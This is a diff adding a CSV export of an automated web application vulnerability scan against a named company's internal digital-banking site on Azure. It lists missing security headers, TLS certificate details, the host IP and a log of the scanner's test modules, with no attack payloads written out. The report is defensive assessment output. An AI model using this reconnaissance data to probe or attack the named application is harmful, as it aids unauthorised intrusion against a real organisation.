@@ -1,0 +1,999 @@
+"Web Application Report","22 Feb 2024 11:26AM GMT+0530"
+"Fint solutions","Near sky view building","Hyd","Andhra Pradesh","500081","India"
+"Dixith Thirukkovalluru","fntsu8dt",""
+"DESCRIPTION"
+"Each targeted web application is listed with the total number of detected vulnerabilities and sensitive content."
+"TARGET"
+"Web Applications","fint-int-digitalbankingui-nra.azurewebsites"
+"FILTERS"
+"Status","New,Active,Re-Opened"
+"Remediation","Do not show ignored findings, Include patched findings"
+"Detection Source","QUALYS,BURP,BUGCROWD"
+"SUMMARY"
+"Security Risk","Web Applications","Vulnerabilities","Sensitive Contents","Information Gathered"
+"Medium","1","1","0","26"
+"Web Application","Level 5","Level 4","Level 3","Level 2","Level 1","Sensitive Contents","Information Gathered"
+"fint-int-digitalbankingui-nra.azurewebsites","0","0","1","0","0","0","26"
+"RESULTS"
+"Web Application Name","VULNERABILITY","ID","QID","Url","Param","Function","Form Entry Point","Access Path","Authentication","Ajax Request","Ajax Request ID","Status","Ignored","Ignore Reason","Ignore Date","Ignore User","Ignore Comments","First Time Detected","Last Time Detected","Last Time Tested","Times Detected","Payload #1","Request Method #1","Request URL #1","Request Headers #1","Response #1","Evidence #1","Unique ID","Request Body #1","Flags","Protocol","Virtual Host","IP","Port","Result","Info#1","CVSS V3 Base","CVSS V3 Temporal","CVSS V3 Attack Vector","Potential"
+"fint-int-digitalbankingui-nra.azurewebsites","VULNERABILITY","7068410","150263","http://fint-int-digitalbankingui-nra.azurewebsites.net/","","","","","Not Required","No","","Active","No","","","","","15 Feb 2024 10:16PM GMT+0530","16 Feb 2024 12:08AM GMT+0530","16 Feb 2024 12:08AM GMT+0530","2","","GET","http://fint-int-digitalbankingui-nra.azurewebsites.net/","Referer: https://fint-int-digitalbankingui-nra.azurewebsites.net/Host: fint-int-digitalbankingui-nra.azurewebsites.netUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.177 Safari/537.36Accept: */*","HTTP/1.1 403 Site Disabled
+Content-Length: 2342
+Connection: close
+Content-Type: text/html
+Date: Thu, 15 Feb 2024 18:39:33 GMT
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Web App - Unavailable</title>
+    <style type=""text/css"">
+        html {
+            height: 100%;
+            width: 100%;
+        }
+
+        #feature {
+            width: 960px;
+            margin: 95px auto 0 auto;
+            overflow: auto;
+        }
+
+        #content {
+            font-family: ""Segoe UI"";
+            font-weight: normal;
+            font-size: 22px;
+            color: #ffffff;
+            float: left;
+         ","","ef44c386-2881-46e0-a598-702d8ff3affb","","","","","","","","","7.6","6.6","Network","false"
+"Web Application Name","INFORMATION GATHERED","ID","QID","Results","Detection Date","Unique ID","Flags","Protocol","Virtual Host","IP","Port","Result","Info#1"
+"fint-int-digitalbankingui-nra.azurewebsites","INFORMATION_GATHERED","3261575","150204","
+X-Xss-Protection: Header missing
+Response headers on link: GET https://fint-int-digitalbankingui-nra.azurewebsites.net/ response code: 403
+Connection: close
+Content-Length: 2342
+Content-Type: text/html
+Date: Thu, 15 Feb 2024 18:39:29 GMT
+
+Header missing on the following link(s):
+(Only first 50 such pages are listed)
+
+GET https://fint-int-digitalbankingui-nra.azurewebsites.net/ response code: 403
+GET https://fint-int-digitalbankingui-nra.azurewebsites.net/favicon.ico response code: 403
+","16 Feb 2024 12:08AM GMT+0530","14d77f0f-b32f-480b-a00a-7524afa461f6","","","","","","",""
+"fint-int-digitalbankingui-nra.azurewebsites","INFORMATION_GATHERED","3261578","86002","","16 Feb 2024 12:08AM GMT+0530","1d1f9bb1-9eda-4581-879e-228b892a790b","","tcp","20.192.170.11","20.192.170.11","443","#table cols=""2""
+NAME VALUE
+(0)CERTIFICATE_0 _
+(0)Version 3_(0x2)
+(0)Serial_Number _33:00:de:0f:ea:89:7d:07:ac:06:cc:8d:42:00:00:00:de:0f:ea_
+(0)Signature_Algorithm sha384WithRSAEncryption
+(0)ISSUER_NAME _
+countryName US
+_organizationName Microsoft_Corporation
+_commonName Microsoft_Azure_TLS_Issuing_CA_01
+(0)SUBJECT_NAME _
+countryName US
+_stateOrProvinceName WA
+_localityName Redmond
+_organizationName Microsoft_Corporation
+_commonName *.azurewebsites.net
+(0)Valid_From Dec_18_08:37:20_2023_GMT
+(0)Valid_Till Jun_27_23:59:59_2024_GMT
+(0)Public_Key_Algorithm rsaEncryption
+(0)RSA_Public_Key (2048_bit)
+(0) _RSA_Public-Key:_(2048_bit)
+(0) _Modulus:
+(0) _00:d8:58:44:3f:df:2d:19:a6:20:70:73:ba:8c:36:
+(0) _88:a0:e0:ed:b1:26:04:30:3f:cb:8f:88:8b:ff:b5:
+(0) _02:e8:b6:eb:03:db:c5:47:cc:99:b7:bf:95:75:e9:
+(0) _72:2a:07:f1:9f:0e:12:8a:2f:4b:24:7b:48:5b:fa:
+(0) _51:f1:1f:16:56:98:f3:11:88:f6:40:19:ed:4c:f0:
+(0) _79:77:55:ee:bd:87:83:a6:dc:05:c7:f6:5a:cf:17:
+(0) _c5:7a:cc:78:20:6b:b9:af:70:0d:ff:e5:d0:72:d8:
+(0) _19:61:42:da:3d:8c:d7:bc:23:58:b2:78:79:ea:09:
+(0) _87:66:df:6f:25:23:41:1e:25:95:33:9b:38:88:de:
+(0) _b8:29:af:4e:7e:b4:9a:3c:fc:68:9d:13:59:81:c8:
+(0) _54:06:dd:f8:d4:6d:90:c8:13:64:6a:22:d9:31:c1:
+(0) _34:7e:8d:53:64:c0:61:fc:41:ff:39:97:3e:0e:d4:
+(0) _99:21:cc:d0:a5:ed:76:a9:eb:73:ed:7d:7c:f2:c5:
+(0) _98:13:db:ac:92:16:de:17:d4:33:e2:9f:f0:12:53:
+(0) _f0:33:56:90:b5:a0:dd:06:7d:63:d4:7e:dc:57:2f:
+(0) _8d:a8:0b:f7:86:87:50:fe:12:29:2c:fc:2f:30:1f:
+(0) _ea:95:b2:f1:9e:e6:e9:fb:a2:c8:7d:b6:1d:42:aa:
+(0) _fb:6d
+(0) _Exponent:_65537_(0x10001)
+(0)X509v3_EXTENSIONS _ 
+(0)CT_Precertificate_SCTs _Signed_Certificate_Timestamp:
+(0) _Version_:_v1_(0x0)
+(0) _Log_ID_:_EE:CD:D0:64:D5:DB:1A:CE:C5:5C:B7:9D:B4:CD:13:A2:
+(0) _32:87:46:7C:BC:EC:DE:C3:51:48:59:46:71:1F:B5:9B
+(0) _Timestamp_:_Dec_18_08:47:23.267_2023_GMT
+(0) _Extensions:_none
+(0) _Signature_:_ecdsa-with-SHA256
+(0) _30:45:02:21:00:BE:F9:8B:CA:D2:56:11:E7:D4:C6:A2:
+(0) _D0:BB:45:50:5D:6E:1A:97:3B:32:7F:7D:87:46:62:87:
+(0) _6C:CE:63:9C:20:02:20:6B:FF:F3:41:6C:30:31:91:D7:
+(0) _E4:75:08:D6:98:EE:01:54:1C:32:AF:4C:E7:D4:90:6A:
+(0) _BA:91:BE:28:0E:D2:FE
+(0) _Signed_Certificate_Timestamp:
+(0) _Version_:_v1_(0x0)
+(0) _Log_ID_:_48:B0:E3:6B:DA:A6:47:34:0F:E5:6A:02:FA:9D:30:EB:
+(0) _1C:52:01:CB:56:DD:2C:81:D9:BB:BF:AB:39:D8:84:73
+(0) _Timestamp_:_Dec_18_08:47:23.280_2023_GMT
+(0) _Extensions:_none
+(0) _Signature_:_ecdsa-with-SHA256
+(0) _30:44:02:20:48:3C:A9:25:65:1B:8C:16:C3:1C:CC:79:
+(0) _C8:C5:B3:C8:57:F2:36:36:37:9D:5A:D4:04:B1:D8:B6:
+(0) _3C:C3:7E:E1:02:20:77:8C:5E:38:A6:AB:AF:82:AF:04:
+(0) _05:68:01:29:0F:39:A9:95:74:B3:44:0F:D1:38:0A:62:
+(0) _AC:6F:9F:F2:2E:CC
+(0) _Signed_Certificate_Timestamp:
+(0) _Version_:_v1_(0x0)
+(0) _Log_ID_:_55:81:D4:C2:16:90:36:01:4A:EA:0B:9B:57:3C:53:F0:
+(0) _C0:E4:38:78:70:25:08:17:2F:A3:AA:1D:07:13:D3:0C
+(0) _Timestamp_:_Dec_18_08:47:23.405_2023_GMT
+(0) _Extensions:_none
+(0) _Signature_:_ecdsa-with-SHA256
+(0) _30:46:02:21:00:AE:8B:FC:60:F5:5E:34:BC:15:CB:11:
+(0) _3F:FA:A9:8D:D5:20:44:22:CB:D4:3C:19:FC:F2:EE:A4:
+(0) _AC:27:ED:FA:FD:02:21:00:D0:4E:39:28:FE:8A:54:60:
+(0) _08:AE:B2:9C:47:0A:27:1A:56:72:66:40:BF:F4:40:B1:
+(0) _52:50:AF:07:50:A4:6E:E4
+(0)1.3.6.1.4.1.311.21.10 _0:d=0_hl=2_l=_24_cons:_SEQUENCE_
+(0) _2:d=1_hl=2_l=_10_cons:_SEQUENCE_
+(0) _4:d=2_hl=2_l=_8_prim:_OBJECT_:TLS_Web_Client_Authentication
+(0) _14:d=1_hl=2_l=_10_cons:_SEQUENCE_
+(0) _16:d=2_hl=2_l=_8_prim:_OBJECT_:TLS_Web_Server_Authentication
+(0)1.3.6.1.4.1.311.21.7 _0:d=0_hl=2_l=_45_cons:_SEQUENCE_
+(0) _2:d=1_hl=2_l=_37_prim:_OBJECT_:1.3.6.1.4.1.311.21.8.15690651.3798470.4214446.239628.16526621.93.4272873.6083518
+(0) _41:d=1_hl=2_l=_1_prim:_INTEGER_:64
+(0) _44:d=1_hl=2_l=_1_prim:_INTEGER_:26
+(0)Authority_Information_Access _CA_Issuers_-_URI:http://www.microsoft.com/pkiops/certs/Microsoft%20Azure%20TLS%20Issuing%20CA%2001%20-%20xsign.crt
+(0) _OCSP_-_URI:http://oneocsp.microsoft.com/ocsp
+(0)X509v3_Subject_Key_Identifier _F9:1B:0A:FB:3E:E7:A2:A0:43:6A:8E:C1:25:CC:DF:95:59:0D:F6:AA
+(0)X509v3_Key_Usage critical
+(0) _Digital_Signature,_Key_Encipherment
+(0)X509v3_Subject_Alternative_Name _DNS:*.azurewebsites.net,_DNS:*.scm.azurewebsites.net,_DNS:*.sso.azurewebsites.net,_DNS:*.centralindia-01.azurewebsites.net,_DNS:*.scm.centralindia-01.azurewebsites.net,_DNS:*.sso.centralindia-01.azurewebsites.net,_DNS:*.centralindia.c.azurewebsites.net,_DNS:*.scm.centralindia.c.azurewebsites.net,_DNS:*.sso.centralindia.c.azurewebsites.net,_DNS:*.azure-mobile.net,_DNS:*.scm.azure-mobile.net
+(0)X509v3_Basic_Constraints critical
+(0) _CA:FALSE
+(0)X509v3_CRL_Distribution_Points 
+(0) _Full_Name:
+(0) _URI:http://www.microsoft.com/pkiops/crl/Microsoft%20Azure%20TLS%20Issuing%20CA%2001.crl
+(0)X509v3_Certificate_Policies _Policy:_1.3.6.1.4.1.311.76.509.1.1
+(0) _CPS:_http://www.microsoft.com/pkiops/Docs/Repository.htm
+(0) _Policy:_2.23.140.1.2.2
+(0)X509v3_Authority_Key_Identifier _keyid:0F:20:5D:D7:A1:57:95:DB:92:CF:2B:D0:C7:C2:77:04:CE:72:80:76
+(0)X509v3_Extended_Key_Usage _TLS_Web_Client_Authentication,_TLS_Web_Server_Authentication
+(0)Signature (512_octets)
+(0) 1e:1c:be:e0:55:bc:bc:c3:17:08:78:ab:23:05:c4:a4
+(0) c2:9b:58:d6:60:3c:b1:52:2d:79:12:15:8b:52:fc:77
+(0) 82:aa:5b:97:4a:06:ce:c7:af:d9:9f:f5:92:5c:5b:2f
+(0) 32:e2:40:44:b3:b1:61:9d:36:5b:b6:85:3d:42:34:ad
+(0) e4:51:17:bd:1e:01:20:eb:68:74:33:f3:74:34:69:9e
+(0) 92:3f:42:9b:ea:19:e4:72:56:9b:57:c1:96:bd:93:83
+(0) 64:81:6c:68:f5:f9:03:fc:38:85:10:4f:8f:58:b1:ce
+(0) c7:71:31:37:1a:b6:e5:95:4c:4e:00:bb:96:90:e7:21
+(0) 50:de:07:a5:62:d2:a1:8c:e6:9c:31:1b:f4:70:9a:cd
+(0) 74:50:a7:71:97:17:26:d7:aa:a1:c4:10:05:70:14:8b
+(0) 70:52:05:fc:34:2e:89:88:9c:35:e2:ab:db:fb:dc:ee
+(0) c1:df:4e:1a:df:e1:d7:25:ce:52:35:dd:04:3e:78:14
+(0) e9:0c:f2:79:c2:a4:10:60:74:bd:49:0a:b9:90:1e:07
+(0) d4:48:ba:24:92:58:e7:a5:43:51:41:60:31:58:42:b1
+(0) 6a:14:23:6b:f4:27:e9:5b:75:9a:db:53:8c:31:0c:67
+(0) 2b:8a:64:8e:34:7f:eb:cc:80:6c:c2:49:a2:0f:f5:ba
+(0) 04:e8:52:4b:61:37:07:7b:1d:95:cd:ac:db:35:ce:ce
+(0) e6:c2:38:88:4f:08:92:9d:4c:b0:e3:b5:ea:43:c8:94
+(0) 03:b7:8d:f3:85:7a:c7:09:57:64:19:3f:bc:5f:a4:37
+(0) fa:75:7f:2f:d4:32:39:eb:34:15:d8:18:86:ed:f8:cd
+(0) f3:ce:56:ed:c2:13:53:71:5e:97:f2:a5:28:73:66:ac
+(0) e5:23:dc:1f:e9:ae:8a:1f:27:66:07:6b:a0:9c:ce:21
+(0) cf:7e:8d:53:ee:62:3c:ab:eb:59:87:4b:ae:49:61:3c
+(0) 4f:03:73:82:90:7d:75:f5:94:fb:8d:db:a8:52:40:cd
+(0) 8a:62:c6:5a:38:57:3c:53:c7:37:cd:dd:f3:9b:52:2d
+(0) a0:0a:b2:2f:b5:4f:f4:9d:88:2c:69:54:22:2b:78:3b
+(0) c7:8a:56:29:63:df:00:39:ee:40:5c:dd:d4:bc:ee:d5
+(0) 05:20:8d:94:1c:d1:13:af:61:7e:27:d8:7d:d1:53:a9
+(0) 12:54:de:a8:1b:3d:77:8f:da:1e:41:35:6f:7e:29:fb
+(0) 38:61:56:5e:b4:48:43:32:f7:f6:8f:70:9b:f5:bb:30
+(0) ae:3b:88:e5:28:f9:97:c9:93:41:c8:75:39:2c:06:47
+(0) a6:69:c5:f2:72:d4:6e:e2:f9:f3:a4:22:00:63:61:9b
+(1)CERTIFICATE_1 _
+(1)Version 3_(0x2)
+(1)Serial_Number _0a:af:a6:c5:ca:63:c4:51:41:ea:3b:e1:f7:c7:53:17_
+(1)Signature_Algorithm sha384WithRSAEncryption
+(1)ISSUER_NAME _
+countryName US
+_organizationName DigiCert_Inc
+_organizationalUnitName www.digicert.com
+_commonName DigiCert_Global_Root_G2
+(1)SUBJECT_NAME _
+countryName US
+_organizationName Microsoft_Corporation
+_commonName Microsoft_Azure_TLS_Issuing_CA_01
+(1)Valid_From Jul_29_12:30:00_2020_GMT
+(1)Valid_Till Jun_27_23:59:59_2024_GMT
+(1)Public_Key_Algorithm rsaEncryption
+(1)RSA_Public_Key (4096_bit)
+(1) _RSA_Public-Key:_(4096_bit)
+(1) _Modulus:
+(1) _00:c7:9d:70:3a:e4:5e:e7:cf:ee:9c:55:9b:51:47:
+(1) _2c:33:40:f4:88:f0:1d:a3:28:69:8f:1a:ae:aa:99:
+(1) _e0:67:df:e3:1c:ab:47:28:27:6a:f5:cb:ee:0d:76:
+(1) _30:f0:31:f1:0e:83:77:d8:5f:07:3a:df:5b:19:05:
+(1) _d0:1a:f6:c0:8b:e5:be:4c:d6:d3:59:da:35:54:a4:
+(1) _1e:9f:8e:4b:78:4b:dd:6e:a7:97:f8:d8:bd:99:d5:
+(1) _78:95:e3:b6:c2:98:71:72:1f:ff:a5:ad:b2:97:05:
+(1) _e5:ac:25:43:d2:d9:25:c8:f0:68:7e:ca:a1:9b:8a:
+(1) _f9:31:e9:5c:23:2d:cc:3f:17:35:57:66:19:6f:c9:
+(1) _23:40:bf:ed:4f:c4:ed:eb:d7:9f:d5:c3:8a:8f:12:
+(1) _62:41:92:33:ad:da:2c:ee:41:b4:b0:af:d3:dd:be:
+(1) _d5:de:06:18:14:90:62:89:51:ab:ee:cf:77:59:11:
+(1) _12:45:81:3e:6d:32:c1:9d:95:6f:c1:88:4b:90:cb:
+(1) _ae:37:a5:12:40:67:28:2c:b2:dc:1d:32:42:e7:7d:
+(1) _76:95:6c:89:47:84:ec:5e:6c:63:c3:1e:f7:a5:95:
+(1) _c5:07:1b:3b:26:1d:11:8f:e3:ff:d5:29:0e:53:86:
+(1) _fa:f0:3e:62:03:af:06:19:0a:12:38:aa:ca:05:69:
+(1) _3f:c1:19:a0:c3:22:8d:ea:61:ce:0e:37:6f:94:22:
+(1) _f6:be:54:ae:f6:28:a3:5f:68:47:ff:29:7f:81:c9:
+(1) _34:33:c5:d3:f1:49:c0:55:4c:5b:c3:e6:08:12:c6:
+(1) _b2:d8:a7:dc:d1:35:f8:d7:96:4e:41:ad:d1:3c:e9:
+(1) _1e:38:0a:c9:f6:83:3f:6b:4e:e1:b0:a4:d4:6e:e9:
+(1) _3f:69:03:15:3e:d2:61:f7:3c:c5:b8:02:90:54:36:
+(1) _50:21:17:b1:a1:ff:7f:96:26:a4:b9:f8:60:f8:8d:
+(1) _14:27:9e:22:27:5a:ef:19:df:4e:f7:38:ec:8c:72:
+(1) _55:c7:07:1e:ad:45:cc:6c:a0:3a:a7:a6:af:11:04:
+(1) _4c:a8:7c:86:f0:d1:e9:e0:5d:ac:1c:26:08:75:60:
+(1) _66:b9:c0:aa:79:fd:dc:9b:46:c8:f2:e2:eb:e7:23:
+(1) _58:65:46:b4:c6:47:c3:35:6f:5f:51:ef:48:51:bb:
+(1) _ef:5b:2c:91:c1:23:27:18:90:35:00:d0:45:61:c4:
+(1) _87:73:71:bc:d6:fb:90:59:40:5e:75:5d:46:49:2f:
+(1) _86:3a:51:19:c8:45:85:30:33:aa:6c:25:b5:d5:a1:
+(1) _58:31:32:08:c2:82:db:1f:e6:49:9b:d9:b6:56:46:
+(1) _63:e8:37:ed:8e:f6:a8:7c:e2:77:0b:72:5b:ba:c1:
+(1) _7a:d6:49
+(1) _Exponent:_65537_(0x10001)
+(1)X509v3_EXTENSIONS _ 
+(1)X509v3_Subject_Key_Identifier _0F:20:5D:D7:A1:57:95:DB:92:CF:2B:D0:C7:C2:77:04:CE:72:80:76
+(1)X509v3_Authority_Key_Identifier _keyid:4E:22:54:20:18:95:E6:E3:6E:E6:0F:FA:FA:B9:12:ED:06:17:8F:39
+(1)X509v3_Key_Usage critical
+(1) _Digital_Signature,_Certificate_Sign,_CRL_Sign
+(1)X509v3_Extended_Key_Usage _TLS_Web_Server_Authentication,_TLS_Web_Client_Authentication
+(1)X509v3_Basic_Constraints critical
+(1) _CA:TRUE,_pathlen:0
+(1)Authority_Information_Access _OCSP_-_URI:http://ocsp.digicert.com
+(1) _CA_Issuers_-_URI:http://cacerts.digicert.com/DigiCertGlobalRootG2.crt
+(1)X509v3_CRL_Distribution_Points 
+(1) _Full_Name:
+(1) _URI:http://crl3.digicert.com/DigiCertGlobalRootG2.crl
+(1) 
+(1) _Full_Name:
+(1) _URI:http://crl4.digicert.com/DigiCertGlobalRootG2.crl
+(1)X509v3_Certificate_Policies _Policy:_2.23.140.1.2.1
+(1) _Policy:_2.23.140.1.2.2
+(1)1.3.6.1.4.1.311.21.1 _0:d=0_hl=2_l=_1_prim:_INTEGER_:00
+(1)Signature (256_octets)
+(1) 25:16:f3:61:ed:08:17:54:b0:19:4a:c3:51:d9:74:66
+(1) 22:7f:62:4b:c3:87:14:20:40:5b:12:89:a2:2f:18:61
+(1) 06:9f:a4:c4:e4:32:a7:ae:ce:82:f7:1d:66:f5:a5:81
+(1) 22:a6:c0:e4:86:23:27:ae:97:de:61:91:00:ec:bc:fb
+(1) ca:a1:04:b5:f8:07:70:40:6c:2b:d2:9c:4a:d4:06:19
+(1) 94:5f:99:65:34:ee:13:d7:1e:71:73:fb:98:13:5e:ac
+(1) c2:13:63:c1:32:54:60:55:46:09:88:0d:b9:98:93:d7
+(1) 7c:1d:34:80:3b:c6:86:d6:1a:fa:61:0d:c0:cf:41:ab
+(1) 50:7d:61:82:f2:2e:34:6d:53:3f:1c:c8:6b:1d:c9:32
+(1) 06:fd:b0:4c:fd:0f:63:71:5f:09:1a:a3:14:fd:48:c0
+(1) 76:1d:69:17:24:e7:9c:71:25:63:9f:4d:a6:2e:c5:f3
+(1) b6:6a:61:82:44:1c:93:36:2c:60:fe:95:ef:15:b0:78
+(1) e0:79:65:f6:08:94:24:a3:b9:25:5e:f7:22:ce:e6:6f
+(1) 50:40:d3:8c:76:90:72:cd:89:fa:43:e0:7f:23:08:39
+(1) 8d:43:30:9d:b5:37:13:89:db:13:d1:0b:fc:00:87:f8
+(1) 73:48:14:55:b6:80:27:ca:ec:6d:91:9e:15:8c:83:a1
+","Certificate Fingerprint:24C7299864E0A2A6964F551C0E8DF2461532FA8C48E4DBBB6080716691F190E5
+"
+"fint-int-digitalbankingui-nra.azurewebsites","INFORMATION_GATHERED","3261552","150528","Number of links with 4xx response code: 2
+(Only first 50 such links are listed)
+
+403	https://fint-int-digitalbankingui-nra.azurewebsites.net/
+403	https://fint-int-digitalbankingui-nra.azurewebsites.net/favicon.ico
+","16 Feb 2024 12:08AM GMT+0530","8433c55e-5048-4d6d-a6dd-834c26728f69","","","","","","",""
+"fint-int-digitalbankingui-nra.azurewebsites","INFORMATION_GATHERED","3261557","150152","Total internal forms seen (this count includes duplicate forms): 0
+
+Crawled forms (Total: 0)
+NOTE: This does not include authentication forms. Authentication forms are reported separately in QID 150115
+","16 Feb 2024 12:08AM GMT+0530","771f1253-6e4b-4703-bdd8-6b20999347eb","","","","","","",""
+"fint-int-digitalbankingui-nra.azurewebsites","INFORMATION_GATHERED","3261568","150262","
+Feature-Policy: Header missing
+Response headers on link: GET https://fint-int-digitalbankingui-nra.azurewebsites.net/ response code: 403
+Connection: close
+Content-Length: 2342
+Content-Type: text/html
+Date: Thu, 15 Feb 2024 18:39:29 GMT
+
+Header missing on the following link(s):
+(Only first 50 such pages are listed)
+
+GET https://fint-int-digitalbankingui-nra.azurewebsites.net/ response code: 403
+GET https://fint-int-digitalbankingui-nra.azurewebsites.net/favicon.ico response code: 403
+","16 Feb 2024 12:08AM GMT+0530","0fd0f35b-c857-459b-a9b5-261a0dc9a0e7","","","","","","",""
+"fint-int-digitalbankingui-nra.azurewebsites","INFORMATION_GATHERED","3261566","150248","
+Permissions-Policy: Header missing
+Response headers on link: GET https://fint-int-digitalbankingui-nra.azurewebsites.net/ response code: 403
+Connection: close
+Content-Length: 2342
+Content-Type: text/html
+Date: Thu, 15 Feb 2024 18:39:29 GMT
+
+Header missing on the following link(s):
+(Only first 50 such pages are listed)
+
+GET https://fint-int-digitalbankingui-nra.azurewebsites.net/ response code: 403
+GET https://fint-int-digitalbankingui-nra.azurewebsites.net/favicon.ico response code: 403
+","16 Feb 2024 12:08AM GMT+0530","41e0d280-0134-4dca-9d4c-f7b30c9a86b1","","","","","","",""
+"fint-int-digitalbankingui-nra.azurewebsites","INFORMATION_GATHERED","3261572","150202","
+X-Content-Type-Options: Header missing
+Response headers on link: GET https://fint-int-digitalbankingui-nra.azurewebsites.net/ response code: 403
+Connection: close
+Content-Length: 2342
+Content-Type: text/html
+Date: Thu, 15 Feb 2024 18:39:29 GMT
+
+Header missing on the following link(s):
+(Only first 50 such pages are listed)
+
+GET https://fint-int-digitalbankingui-nra.azurewebsites.net/ response code: 403
+GET https://fint-int-digitalbankingui-nra.azurewebsites.net/favicon.ico response code: 403
+","16 Feb 2024 12:08AM GMT+0530","94dd8eed-6699-40a4-aa64-edd67a654b10","","","","","","",""
+"fint-int-digitalbankingui-nra.azurewebsites","INFORMATION_GATHERED","3261559","150546","Base URI: https://fint-int-digitalbankingui-nra.azurewebsites.net/
+Response Code: 403
+Response Header: 
+	Connection: close
+	Content-Length: 2342
+	Content-Type: text/html
+	Date: Thu, 15 Feb 2024 18:39:29 GMT
+	
+Response Body: 
+	&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;
+	    &lt;title&gt;Web App - Unavailable&lt;/title&gt;
+	    &lt;style type=""text/css""&gt;
+	        html {
+	            height: 100%;
+	            width: 100%;
+	        }
+	
+	        #feature {
+	            width: 960px;
+	            margin: 95px auto 0 auto;
+	            overflow: auto;
+	        }
+	
+	        #content {
+	            font-family: ""Segoe UI"";
+	            font-weight: normal;
+	            font-size: 22px;
+	            color: #ffffff;
+	            float: left;
+	            width: 460px;
+	       
+	...
+","16 Feb 2024 12:08AM GMT+0530","9a9163d6-44de-4d52-8a67-e1888fc54b6f","","","","","","",""
+"fint-int-digitalbankingui-nra.azurewebsites","INFORMATION_GATHERED","3261579","38600","","16 Feb 2024 12:08AM GMT+0530","40528851-e544-45b6-aec0-e198830fbf76","","tcp","20.192.170.11","20.192.170.11","443","Certificate #0 CN=*.azurewebsites.net,O=Microsoft_Corporation,L=Redmond,ST=WA,C=US The certificate will expire within six months: Jun 27 23:59:59 2024 GMT
+Certificate #1 CN=Microsoft_Azure_TLS_Issuing_CA_01,O=Microsoft_Corporation,C=US The certificate will expire within six months: Jun 27 23:59:59 2024 GMT
+","Certificate Fingerprint:24C7299864E0A2A6964F551C0E8DF2461532FA8C48E4DBBB6080716691F190E5
+"
+"fint-int-digitalbankingui-nra.azurewebsites","INFORMATION_GATHERED","3261583","38597","","16 Feb 2024 12:08AM GMT+0530","ba01ea78-95a4-462f-bbba-69cb83c65156","","tcp","20.192.170.11","20.192.170.11","443","#table cols=2
+my_version target_version
+0304 0303
+0399 0303
+0400 0303
+0499 0303
+",""
+"fint-int-digitalbankingui-nra.azurewebsites","INFORMATION_GATHERED","3261555","150021","Loaded 0 exclude list entries.
+Loaded 0 allow list entries.
+HTML form authentication unavailable, no WEBAPP entry found
+Target web application page https://fint-int-digitalbankingui-nra.azurewebsites.net/ fetched. Status code:403, Content-Type:text/html, load time:1 milliseconds.
+Batch #0 VirtualHostDiscovery: estimated time &lt; 10 minutes (70 tests, 0 inputs)
+VirtualHostDiscovery: 70 vulnsigs tests, completed 0  requests, 20 seconds. Completed 0 requests of 70 estimated requests (0%). Module did not finish.
+Batch #0 CMSDetection: estimated time &lt; 1 minute (1 tests, 1 inputs)
+[CMSDetection phase] : No potential CMS found using Blind Elephant algorithm. Aborting the CMS Detection phase
+CMSDetection: 1 vulnsigs tests, completed 40  requests, 162 seconds. Completed 40 requests of 56 estimated requests (71.4286%). All tests completed.
+Collected 2 links overall in 0 hours 5 minutes duration.
+Batch #0 BannersVersionReporting: estimated time &lt; 1 minute (1 tests, 1 inputs)
+BannersVersionReporting: 1 vulnsigs tests, completed 0  requests, 0 seconds. Completed 0 requests of 1 estimated requests (0%). All tests completed.
+Path manipulation: Estimated requests (payloads x links): files with extension:(0 x 1) + files:(0 x 1) +  directories:(9 x 1) +  paths:(0 x 2) = total (9) 
+Batch #0 WS Directory Path manipulation: estimated time &lt; 1 minute (9 tests, 2 inputs)
+WS Directory Path manipulation: 9 vulnsigs tests, completed 9  requests, 10 seconds. Completed 9 requests of 9 estimated requests (100%). All tests completed.
+Batch #0 WS enumeration: estimated time &lt; 1 minute (11 tests, 2 inputs)
+WS enumeration: 11 vulnsigs tests, completed 12  requests, 20 seconds. Completed 12 requests of 22 estimated requests (54.5455%). All tests completed.
+Batch #1 URI parameter manipulation (no auth): estimated time &lt; 1 minute (113 tests, 0 inputs)
+Batch #1 URI parameter manipulation (no auth): 113 vulnsigs tests, completed 0  requests, 0 seconds. No tests to execute.
+Batch #1 URI blind SQL manipulation (no auth): estimated time &lt; 1 minute (8 tests, 0 inputs)
+Batch #1 URI blind SQL manipulation (no auth): 8 vulnsigs tests, completed 0  requests, 0 seconds. No tests to execute.
+Batch #1 URI parameter time-based tests (no auth): estimated time &lt; 1 minute (16 tests, 0 inputs)
+Batch #1 URI parameter time-based tests (no auth): 16 vulnsigs tests, completed 0  requests, 0 seconds. No tests to execute.
+Batch #1 URI parameter time-based tests for Apache Struts Vulnerabilities (no auth): estimated time &lt; 1 minute (1 tests, 0 inputs)
+Batch #1 URI parameter time-based tests for Apache Struts Vulnerabilities (no auth): 1 vulnsigs tests, completed 0  requests, 0 seconds. No tests to execute.
+Batch #4 WebCgiOob: estimated time &lt; 1 minute (133 tests, 1 inputs)
+Batch #4 WebCgiOob: 133 vulnsigs tests, completed 196  requests, 323 seconds. Completed 196 requests of 310 estimated requests (63.2258%). All tests completed.
+No XML requests found. Skipping XXE tests.
+Batch #4 DOM XSS exploitation: estimated time &lt; 1 minute (4 tests, 0 inputs)
+Batch #4 DOM XSS exploitation: 4 vulnsigs tests, completed 0  requests, 1 seconds. No tests to execute.
+Batch #4 HTTP call manipulation: estimated time &lt; 1 minute (38 tests, 0 inputs)
+Batch #4 HTTP call manipulation: 38 vulnsigs tests, completed 0  requests, 0 seconds. No tests to execute.
+Batch #4 Open Redirect analysis: estimated time &lt; 1 minute (2 tests, 0 inputs)
+Batch #4 Open Redirect analysis: 2 vulnsigs tests, completed 0  requests, 1 seconds. No tests to execute.
+CSRF tests will not be launched because the scan is not successfully authenticated.
+Batch #4 File Inclusion analysis: estimated time &lt; 1 minute (1 tests, 2 inputs)
+Batch #4 File Inclusion analysis: 1 vulnsigs tests, completed 0  requests, 0 seconds. Completed 0 requests of 2 estimated requests (0%). All tests completed.
+Batch #4 Cookie manipulation: estimated time &lt; 1 minute (47 tests, 0 inputs)
+Batch #4 Cookie manipulation: 47 vulnsigs tests, completed 0  requests, 0 seconds. No tests to execute.
+Batch #4 Header manipulation: estimated time &lt; 1 minute (47 tests, 2 inputs)
+Batch #4 Header manipulation: 47 vulnsigs tests, completed 126  requests, 212 seconds. Completed 126 requests of 260 estimated requests (48.4615%). XSS optimization removed 58 links. All tests completed.
+Batch #4 shell shock detector: estimated time &lt; 1 minute (1 tests, 2 inputs)
